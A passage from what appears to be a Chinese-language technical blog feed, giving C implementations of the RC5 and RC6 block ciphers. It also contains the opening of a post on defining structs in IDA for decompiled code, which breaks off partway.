class="keyword">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a><a href="https://en.wikipedia.org/wiki/RC5" target="_blank" rel="noopener">RC5</a></h1><p>RC5 同样也是分组密码，它支持可变的分组大小(32、64 或 128 比特)，密钥长度（0 至 2040 位）和加密轮数（0 ～ 255）。RC5 中有几个参数，w 代表一个字的字节大小，RC5 是以一个字为单位来进行所有操作的；r 代表加密轮数；b 代表密钥的长度。RC5 常用的 w 通常为 16、32 和 64。下面实现的是 w 为 32 时的 RC5 算法。</p><p>RC5 和 RC2 类似，总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc5.png" alt="RC5 加密算法"></p><p>算法中需要一些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> WORD;           <span class="comment">/* Should be 32-bit = 4 bytes        */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> w 32                         <span class="comment">/* word size in bits                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r 12                         <span class="comment">/* number of rounds                  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> b 16                         <span class="comment">/* number of bytes in key            */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> c 4                          <span class="comment">/* number words in key               */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> t 26                         <span class="comment">/* size of table S = 2*(r+1) words   */</span></span></span><br><span class="line">WORD S[t];                           <span class="comment">/* expanded key table                */</span></span><br><span class="line">WORD P = <span class="number">0xb7e15163</span>, Q = <span class="number">0x9e3779b9</span>; <span class="comment">/* magic constants                   */</span></span><br><span class="line"><span class="comment">/* Rotation operators. x must be unsigned, to get logical right shift     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y) (((x) <span class="meta-string">&lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</span></span><br></pre></td></tr></table></figure><h2 id="密钥扩展算法-1"><a href="#密钥扩展算法-1" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展首先分别初始化 L 数组和 S 盒，随后通过 L 进行按字异或得到 S 盒。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *K)</span> <span class="comment">/* secret input ket K[0...b-1] */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD i, j, k, u = w / <span class="number">8</span>, A, B, L[c];</span><br><span class="line">    <span class="comment">/* Initialize L, then S, then mix key into S */</span></span><br><span class="line">    <span class="keyword">for</span> (i = b - <span class="number">1</span>, L[c - <span class="number">1</span>] = <span class="number">0</span>; i != <span class="number">-1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        L[i / u] = (L[i / u] &lt;&lt; <span class="number">8</span>) + K[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (S[<span class="number">0</span>] = P, i = <span class="number">1</span>; i &lt; t; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        S[i] = S[i - <span class="number">1</span>] + Q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (A = B = i = j = k = <span class="number">0</span>; k &lt; <span class="number">3</span> * t; k++, i = (i + <span class="number">1</span>) % t, j = (j + <span class="number">1</span>) % c) <span class="comment">/* 3*t &gt; 3*c */</span></span><br><span class="line">    &#123;</span><br><span class="line">        A = S[i] = ROTL(S[i] + (A + B), <span class="number">3</span>);</span><br><span class="line">        B = L[j] = ROTL(L[j] + (A + B), (A + B));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法-1"><a href="#加密算法-1" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密涉及的一个简单轮函数的加密。基于安全需要和时间方面的考虑，建议 12 或 20 轮加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span> <span class="comment">/* 2 WORD input pt/output ct */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">2</span>], ct[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pt[i] = plain[<span class="number">4</span> * i] + (plain[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (plain[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (plain[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A = pt[<span class="number">0</span>] + S[<span class="number">0</span>], B = pt[<span class="number">1</span>] + S[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= r; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = ROTL(A ^ B, B) + S[<span class="number">2</span> * i];</span><br><span class="line">        B = ROTL(B ^ A, A) + S[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ct[<span class="number">0</span>] = A;</span><br><span class="line">    ct[<span class="number">1</span>] = B;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[<span class="number">4</span> * i] = ct[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">1</span>] = (ct[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">2</span>] = (ct[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">3</span>] = (ct[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法-1"><a href="#解密算法-1" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密实际上就是加密过程的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc5_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher, <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain)</span> <span class="comment">/* 2 WORD input ct/output pt */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">2</span>], ct[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ct[i] = cipher[<span class="number">4</span> * i] + (cipher[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (cipher[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (cipher[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WORD B = ct[<span class="number">1</span>], A = ct[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = r; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        B = ROTR(B - S[<span class="number">2</span> * i + <span class="number">1</span>], A) ^ A;</span><br><span class="line">        A = ROTR(A - S[<span class="number">2</span> * i], B) ^ B;</span><br><span class="line">    &#125;</span><br><span class="line">    pt[<span class="number">1</span>] = B - S[<span class="number">1</span>];</span><br><span class="line">    pt[<span class="number">0</span>] = A - S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plain[<span class="number">4</span> * i] = pt[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">1</span>] = (pt[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">2</span>] = (pt[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">3</span>] = (pt[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="RC6"><a href="#RC6" class="headerlink" title="RC6"></a><a href="https://en.wikipedia.org/wiki/RC6" target="_blank" rel="noopener">RC6</a></h1><p>RC6 是一个从 RC5 派生而来的对称分组加密算法，用以满足高级加密标准（AES）竞赛的要求。RC6 拥有 128 位的块大小，支持 128、192、256 位乃至 2040 位的密钥长度。像 RC5 一样，RC6 是可以被参数化的。它也因而支持变长的分组大小、密钥长度以及加密轮数。RC6 和 RC5 在结构、使用基于数据的置换规则、取模加法以及异或操作等很多方面都很相似。事实上，RC6 可以被看做是交织的两组平行的 RC5 加密。其中，RC6 使用了乘法运算，能够让置换基于字中每一位，而不是其中的几位。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc6.jpeg" alt="RC6 加密算法"></p><p>算法中需要一些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> WORD;           <span class="comment">/* Should be 32-bit = 4 bytes        */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> w 32                         <span class="comment">/* word size in bits                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r 20                         <span class="comment">/* based on security estimates       */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bytes (w / 8)                <span class="comment">/* bytes per word                    */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> c ((b + bytes - 1) / bytes)  <span class="comment">/* key in words, rounded up          */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R24 (2 * r + 4)              <span class="comment">/* length of array S                 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lgw 5                        <span class="comment">/* log2(w) -- wussed out             */</span></span></span><br><span class="line">WORD S[R24 - <span class="number">1</span>];                     <span class="comment">/* Key schedule                      */</span></span><br><span class="line">WORD P = <span class="number">0xb7e15163</span>, Q = <span class="number">0x9e3779b9</span>; <span class="comment">/* magic constants                   */</span></span><br><span class="line"><span class="comment">/* Rotation operators. x must be unsigned, to get logical right shift     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x, y) (((x) <span class="meta-string">&lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</span></span><br></pre></td></tr></table></figure><h2 id="密钥扩展算法-2"><a href="#密钥扩展算法-2" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>RC6 中接受的密钥长度相比于 RC5 更长，生成的 S 盒大小为 2r+4。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *K, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, s, v;</span><br><span class="line">    WORD L[(<span class="number">32</span> + bytes - <span class="number">1</span>) / bytes]; <span class="comment">/* Big enough for max b */</span></span><br><span class="line">    WORD A, B;</span><br><span class="line"></span><br><span class="line">    L[c - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = b - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        L[i / bytes] = (L[i / bytes] &lt;&lt; <span class="number">8</span>) + K[i];</span><br><span class="line"></span><br><span class="line">    S[<span class="number">0</span>] = P;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * r + <span class="number">3</span>; i++)</span><br><span class="line">        S[i] = S[i - <span class="number">1</span>] + Q;</span><br><span class="line"></span><br><span class="line">    A = B = i = j = <span class="number">0</span>;</span><br><span class="line">    v = R24;</span><br><span class="line">    <span class="keyword">if</span> (c &gt; v)</span><br><span class="line">        v = c;</span><br><span class="line">    v *= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (s = <span class="number">1</span>; s &lt;= v; s++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = S[i] = ROTL(S[i] + A + B, <span class="number">3</span>);</span><br><span class="line">        B = L[j] = ROTL(L[j] + A + B, A + B);</span><br><span class="line">        i = (i + <span class="number">1</span>) % R24;</span><br><span class="line">        j = (j + <span class="number">1</span>) % c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法-2"><a href="#加密算法-2" class="headerlink" title="加密算法"></a>加密算法</h2><p>RC6 加密时比 RC5 多了乘法运算，加密过程也变得更复杂。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">4</span>], ct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pt[i] = plain[<span class="number">4</span> * i] + (plain[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (plain[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (plain[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A, B, C, D, t, u, x;</span><br><span class="line"></span><br><span class="line">    A = pt[<span class="number">0</span>];</span><br><span class="line">    B = pt[<span class="number">1</span>];</span><br><span class="line">    C = pt[<span class="number">2</span>];</span><br><span class="line">    D = pt[<span class="number">3</span>];</span><br><span class="line">    B += S[<span class="number">0</span>];</span><br><span class="line">    D += S[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">2</span> * r; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        t = ROTL(B * (<span class="number">2</span> * B + <span class="number">1</span>), lgw);</span><br><span class="line">        u = ROTL(D * (<span class="number">2</span> * D + <span class="number">1</span>), lgw);</span><br><span class="line">        A = ROTL(A ^ t, u) + S[i];</span><br><span class="line">        C = ROTL(C ^ u, t) + S[i + <span class="number">1</span>];</span><br><span class="line">        x = A;</span><br><span class="line">        A = B;</span><br><span class="line">        B = C;</span><br><span class="line">        C = D;</span><br><span class="line">        D = x;</span><br><span class="line">    &#125;</span><br><span class="line">    A += S[<span class="number">2</span> * r + <span class="number">2</span>];</span><br><span class="line">    C += S[<span class="number">2</span> * r + <span class="number">3</span>];</span><br><span class="line">    ct[<span class="number">0</span>] = A;</span><br><span class="line">    ct[<span class="number">1</span>] = B;</span><br><span class="line">    ct[<span class="number">2</span>] = C;</span><br><span class="line">    ct[<span class="number">3</span>] = D;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[<span class="number">4</span> * i] = ct[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">1</span>] = (ct[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">2</span>] = (ct[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        cipher[<span class="number">4</span> * i + <span class="number">3</span>] = (ct[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法-2"><a href="#解密算法-2" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密过程同样是加密过程的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc6_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher, <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WORD pt[<span class="number">4</span>], ct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ct[i] = cipher[<span class="number">4</span> * i] + (cipher[<span class="number">4</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (cipher[<span class="number">4</span> * i + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (cipher[<span class="number">4</span> * i + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WORD A, B, C, D, t, u, x;</span><br><span class="line"></span><br><span class="line">    A = ct[<span class="number">0</span>];</span><br><span class="line">    B = ct[<span class="number">1</span>];</span><br><span class="line">    C = ct[<span class="number">2</span>];</span><br><span class="line">    D = ct[<span class="number">3</span>];</span><br><span class="line">    C -= S[<span class="number">2</span> * r + <span class="number">3</span>];</span><br><span class="line">    A -= S[<span class="number">2</span> * r + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> * r; i &gt;= <span class="number">2</span>; i -= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x = D;</span><br><span class="line">        D = C;</span><br><span class="line">        C = B;</span><br><span class="line">        B = A;</span><br><span class="line">        A = x;</span><br><span class="line">        u = ROTL(D * (<span class="number">2</span> * D + <span class="number">1</span>), lgw);</span><br><span class="line">        t = ROTL(B * (<span class="number">2</span> * B + <span class="number">1</span>), lgw);</span><br><span class="line">        C = ROTR(C - S[i + <span class="number">1</span>], t) ^ u;</span><br><span class="line">        A = ROTR(A - S[i], u) ^ t;</span><br><span class="line">    &#125;</span><br><span class="line">    D -= S[<span class="number">1</span>];</span><br><span class="line">    B -= S[<span class="number">0</span>];</span><br><span class="line">    pt[<span class="number">0</span>] = A;</span><br><span class="line">    pt[<span class="number">1</span>] = B;</span><br><span class="line">    pt[<span class="number">2</span>] = C;</span><br><span class="line">    pt[<span class="number">3</span>] = D;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plain[<span class="number">4</span> * i] = pt[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">1</span>] = (pt[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">2</span>] = (pt[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        plain[<span class="number">4</span> * i + <span class="number">3</span>] = (pt[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/RC_algorithm" target="_blank" rel="noopener">RC_algorithm</a><br><a href="https://www.ripublication.com/irph/ijict_spl/ijictv4n17spl_13.pdf" target="_blank" rel="noopener">A Comparative Study of Rivest Cipher Algorithms</a><br><a href="http://113.209.194.153/ds_pdf/13711077.pdf" target="_blank" rel="noopener">现代密码学教程</a><br><a href="https://tools.ietf.org/pdf/rfc2268.pdf" target="_blank" rel="noopener">A Description of the RC2(r) Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/Rivest-rc5rev.pdf" target="_blank" rel="noopener">The RC5 Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/pubs/RRSY98.pdf" target="_blank" rel="noopener">The RC6 Block Cipher</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="c" scheme="https://qianfei11.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>如何使用IDA创建结构体</title>
    <link href="https://qianfei11.github.io/2019/09/01/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8IDA%E5%88%9B%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <id>https://qianfei11.github.io/2019/09/01/如何使用IDA创建结构体/</id>
    <published>2019-09-01T03:16:02.000Z</published>
    <updated>2019-09-01T08:07:29.727Z</updated>
    
    <content type="html"><![CDATA[<p>IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体</p><a id="more"></a><h1 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h1><p>源码摘自菜鸟教程的 C 语言教程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">10</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span class="number">20</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125; book = &#123;<span class="string">"C 语言"</span>, <span class="string">"RUNOOB"</span>, <span class="string">"编程语言"</span>, <span class="number">123456</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"title : %s\nauthor: %s\nsubject: %s\nbook_id: %d\n"</span>, book.title, book.author, book.subject, book.book_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>在 IDA 中 f5 反编译后得到的结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> 